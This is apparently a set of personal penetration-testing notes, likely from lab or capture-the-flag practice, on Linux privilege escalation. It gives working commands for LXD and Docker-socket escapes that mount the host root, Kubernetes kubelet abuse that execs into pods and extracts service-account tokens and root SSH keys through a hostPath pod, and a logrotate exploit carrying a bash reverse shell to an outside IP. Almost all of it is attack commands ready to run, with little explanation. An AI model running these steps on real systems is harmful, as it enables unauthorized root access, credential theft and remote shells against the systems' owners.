```sh
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

https://github.com/DominicBreuker/pspy

```sh
#print both commands and file system events and scan procfs every 1000 ms (=1sec)
./pspy64 -pf -i 1000
```

LXD : 

```sh
lxc image import ubuntu-template.tar.xz --alias ubuntutemp
lxc image list
```

```sh
lxc init ubuntutemp privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

Get a root shell : 
```sh
lxc start privesc
lxc exec privesc /bin/bash # or sh for the command 
```

Docker : 

We create our own docker : 
```sh
wget https://master.dockerproject.org/linux/x86_64/docker
chmod +x docker
docker -H unix:///app/docker.sock ps
``` 

```sh
docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app
docker -H unix:///app/docker.sock ps
docker -H unix:///app/docker.sock exec -it 7ae3bcc818af /bin/bash

cat /hostsystem/root/.ssh/id_rsa
```

Other way to privesc when the socket is writable  :

```sh
docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Kubernetes 
 
Extracting Pods with anonymous access:
```sh
curl https://10.129.10.11:10250/pods -k | jq .
#or 
kubeletctl -i --server 10.129.10.11 pods
```
Available command : 
```sh
 kubeletctl -i --server 10.129.10.11 scan rce
 #then get a root access
 kubeletctl -i --server 10.129.10.11 exec "id" -p nginx -c nginx
```

Extracting Tokens : 

```sh
kubeletctl -i --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx | tee -a k8.token
```
Extracting Certificate : 
```sh
kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx | tee -a ca.crt
```

List Privileges
```sh
export token=`cat k8.token`
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list
#output

Resources										Non-Resource URLs	Resource Names	Verbs 
selfsubjectaccessreviews.authorization.k8s.io		[]					[]				[create]
selfsubjectrulesreviews.authorization.k8s.io		[]					[]				[create]
pods											    []					[]				[get create list]
```

Create our own YAML pod : 
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: privesc
  namespace: default
spec:
  containers:
  - name: privesc
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /root
      name: mount-root-into-mnt
  volumes:
  - name: mount-root-into-mnt
    hostPath:
       path: /
  automountServiceAccountToken: true
  hostNetwork: true
```
Creation new pod : 

```sh
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 apply -f privesc.yaml
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.96.98:6443 get pods
#output

NAME	READY	STATUS	RESTARTS	AGE
nginx	1/1		Running	0			23m
privesc	1/1		Running	0			12s
```

Extracting root ssh or make a reverse shell : 

```sh
kubeletctl --server 10.129.10.11 exec "cat /root/root/.ssh/id_rsa" -p privesc -c privesc
```

Logrotate : 

```sh
git clone https://github.com/whotwagner/logrotten.git
cd logrotten
gcc logrotten.c -o logrotten
echo 'bash -i >& /dev/tcp/10.10.14.2/9001 0>&1' > payload
```

In our case, it is the option: `create`. Therefore we have to use the exploit adapted to this function.
```sh
grep "create\|compress" /etc/logrotate.conf | grep -v "#"
```

exploit: 
```sh
./logrotten -p ./payload /tmp/tmp.log
```